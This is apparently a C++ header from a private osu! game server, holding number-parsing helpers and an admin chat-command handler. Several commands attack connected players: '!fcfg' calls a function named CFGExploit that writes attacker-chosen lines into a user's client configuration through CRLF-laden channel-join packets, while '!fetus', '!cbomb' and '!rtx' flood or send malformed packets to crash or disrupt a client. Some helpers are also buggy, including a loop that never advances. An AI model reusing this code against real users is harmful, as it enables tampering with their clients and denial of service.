#pragma once






#define Roll(u,input)\
	[&](const uint64_t Max)->const std::string{\
		return u->Username + " rolled " + std::to_string(BR::GetRand64(0, (Max) ? Max : 100));\
	}(input)

#define StringToUInt64(s)\
	[&]()->uint64_t{\
		uint64_t ret = 0;\
		for(DWORD i=0;i<s.size();i++){\
			if(s[i] < '0' || s[i] > '9')\
				continue;\
			uint64_t N = (ret * 10) + (s[i] - '0');\
			if(N < ret ||(i == 0 && s[i] == '-'))return uint64_t(-1);\
			ret = N;\
		}\
		return ret;\
	}()

#define TRIMSTRING(str)\
	[](std::string &s)->std::string{\
		if(!s.size())return s;\
		for(DWORD ii = s.size()-1;ii>0;ii--){\
			if(s[ii] != ' ')break;\
			s.pop_back();\
		}\
		if(s[0] != ' ')return s;\
		DWORD Start = 0;\
		for(DWORD ii=0;ii<s.size();ii++)\
			if (s[ii] != ' ') {\
				Start=ii;\
				break;\
			}\
		if(Start == 0){s.resize(0);return s;}\
		const DWORD nSize = s.size() - Start;\
		memcpy(&s[0],&s[Start],nSize);s.resize(nSize);\
		return s;\
	}(str)




__forceinline DWORD Safe_stoul(const std::string &Input){

	if (Input.size() == 0)return 0;

	DWORD Return = 0;

	for (DWORD i = 0; i < Input.size(); i++) {
		if (Input[i] < '0' || Input[i] > '9')return 0;

		Return *= 10;

		Return += Input[i] - '0';
	}

	return Return;
}
__forceinline int Safe_atoi(const char *c ,const bool Len = 0) {

	if (c[0] == 0)return 0;

	int Return = 0;
	DWORD Offset = 0;
	while(c[Offset] != 0){
		
		if (c[Offset] < '0' || c[Offset] > '9')
			if(!Len)return 0;
			else continue;

		Return *= 10;

		Return += c[Offset] - '0';

		Offset++;
	}

	return Return;
}
__forceinline uint64_t Safe_stou64(const std::string &c) {

	uint64_t Return = 0;
	
	for(DWORD i=0;i<c.size();i++){

		if (c[i] >= '0' && c[i] <= '9') {
			Return *= 10;
			Return += c[i] - '0';
		}
	}

	return Return;
}
__forceinline DWORD Safe_atoui(const char *c, const bool Len = 0) {

	if (c[0] == 0)return 0;

	DWORD Return = 0;
	DWORD Offset = 0;
	while (c[Offset] != 0) {

		if (c[Offset] < '0' || c[Offset] > '9')
			if (!Len)return 0;
			else continue;

			Return *= 10;

			Return += c[Offset] - '0';

			Offset++;
	}

	return Return;
}


__forceinline bool Fetus(const std::string &Target) {

	if (Target.size() == 0)return 0;

	_User *u = GetUserFromNameSafe(Target);

	if (!u)return 0;

	_BanchoPacket b = bPacket::Message("", "", "", 0);
	u->qLock.lock();
	for (DWORD i = 0; i < 16; i++)
		u->addQueNonLocking(b);
	u->qLock.unlock();
	return 1;
}


void ReplaceAll(std::string &str, const std::string& from, const std::string& to) {
	size_t start_pos = 0;
	while ((start_pos = str.find(from, start_pos)) != std::string::npos){
		str.replace(start_pos, from.length(), to);
		start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
	}
}


std::string CFGExploit(const std::string &Target,std::string &NewCFGLine){

	_User * u = GetUserFromNameSafe(Target);
	if (!u)return "Could not find user";

	ReplaceAll(NewCFGLine, "\\n", "\n\n");
	u->qLock.lock();
	u->HyperMode = 1;
	u->addQueNonLocking(_BanchoPacket(OPac::server_getAttention));
	for(DWORD i=0;i<10;i++)
		u->addQueNonLocking(bPacket::GenericString(OPac::server_channelJoinSuccess, "# \r\n" + NewCFGLine + "\r\nChatChannels = #osu" + std::to_string(i)));

	u->addQueNonLocking(bPacket::Message("BanchoBot",Target,"Do fish blink",0));

	u->addQueDelayNonLocking(_DelayedBanchoPacket(1, bPacket::GenericString(OPac::server_channelKicked, "BanchoBot")));

	const _BanchoPacket fPacket = bPacket::Message("", "", "", 0);
	for(DWORD i=0;i<16;i++)
		u->addQueDelayNonLocking(_DelayedBanchoPacket(2, fPacket));
	u->qLock.unlock();

	return "Done.";
}

const std::string ProcessCommand(_User* u,const std::string &Command, DWORD &PermSeeResponse){

	const DWORD Priv = u->privileges;

	PermSeeResponse = 0;
	
	if (Command.size() == 0 || Command[0] != '!')return "";

	const auto Split = Explode(Command, ' ');

	if (Split[0] == "!roll")
		return Roll(u, (Split.size() > 1) ? StringToUInt64(Split[1]) : 100);

	if (Split[0] == "!fetus"){

		if (!(Priv & Privileges::AdminDev))goto INSUFFICIENTPRIV;

		PermSeeResponse = 1;

		std::string Target = "";

		for (DWORD i = 1; i < Split.size(); i++)
			Target += (i > 1) ? " " + Split[i] : Split[i];

		UserNameSafe(Target);

		if(Fetus(Target))
			return "deltus. " + Target + " is now gone.";

		return "not completus. That user does not exist.";
	}
	if (Split[0] == "!alert"){

		if (!(Priv & Privileges::AdminDev))goto INSUFFICIENTPRIV;

		PermSeeResponse = 1;

		std::string Message = "";

		for (DWORD i = 1; i < Split.size(); i++)
			Message += (i > 1) ? " " + Split[i] : Split[i];

		if (Message.size() == 0)
			return "An empty alert would make everyone reconnect...";

		const _BanchoPacket b = bPacket::Notification(Message.c_str());

		for (DWORD i = 0; i < MAX_USER_COUNT;i++)
			if (User[i].choToken)
				User[i].addQue(b);

		return "Alerted all online users.";
	}
	if (Split[0] == "!specme"){

		u->addQue(bPacket::UserPanel(998,0));
		u->addQue(bPacket::UserStats(998, 0));

		u->addQueDelay(_DelayedBanchoPacket(1,bPacket::GenericInt32(OPac::server_spectatorJoined, 998)));

		return "";
	}
	if (Split[0] == "!rtx"){
		PermSeeResponse = 1;

		if (!(Priv & Privileges::AdminDev))goto INSUFFICIENTPRIV;

		if (Split.size() < 2)
			return "No target";

		_User *Target = GetUserFromName(Split[1], 1);

		if (!Target || !Target->choToken)return "User not online";

		std::string Message = "";

		for (DWORD i = 2; i < Split.size(); i++)
			Message += (i > 2) ? " " + Split[i] : Split[i];

		Target->addQue(bPacket::GenericString(0x69, Message));

		return "You monster.";
	}
	if (Split[0] == "!b"){

		if (!(Priv & Privileges::AdminDev))
			goto INSUFFICIENTPRIV;

		std::string Message = "";

		for (DWORD i = 1; i < Split.size(); i++)
			Message += (i > 1) ? " " + Split[i] : Split[i];

		return Message;
	}
	if (Split[0] == "!priv"){
		return std::to_string(Priv);
	}
	if (Split[0] == "!fcfg"){

		if (!(Priv & Privileges::AdminDev))
			goto INSUFFICIENTPRIV;

		PermSeeResponse = 1;
		if (Split.size() > 2) {
			std::string Message = "";

			for (DWORD i = 2; i < Split.size(); i++)
				Message += (i > 2) ? " " + Split[i] : Split[i];

			std::string T = Split[1];

			UserNameSafe(T);
			return CFGExploit(T,Message);
		}
		return "!fcfg <username> <config lines>";
	}

	if (Split[0] == "!cbomb") {

		if (!(Priv & Privileges::AdminDev) || Split.size() != 3)
			goto INSUFFICIENTPRIV;

		PermSeeResponse = 1;
		
		std::string T = Split[1];

		UserNameSafe(T);

		_User *t = GetUserFromNameSafe(T);

		if (t) {
			DWORD Count = Safe_stoul(Split[2]);

			if (Count >= USHORT(-1))
				Count = USHORT(-1);

			t->qLock.lock();

			for (DWORD i = 0; i < Count; i++)
				t->addQueNonLocking(bPacket::GenericString(OPac::server_channelJoinSuccess, "#" + std::to_string(i)));

			t->qLock.unlock();

		}

		return "okay";
	}


	if (Split[0] == "!reconnect"){
		u->choToken = GenerateChoToken();
		return "";
	}

	/*if (Split[0] == "!choosescore" || Split[0] == "!cs"){
		u->Menu.aux1 = 0;
		u->Menu.LastPage = 0;
		u->Menu.State = Menu_ChooseScore;
		return "";
	}*/

	//search hard coded commands

	//command look up table search loaded from script files	

	return "";
INSUFFICIENTPRIV:
	PermSeeResponse = 1;
	return "You are not allowed to use that command.";

}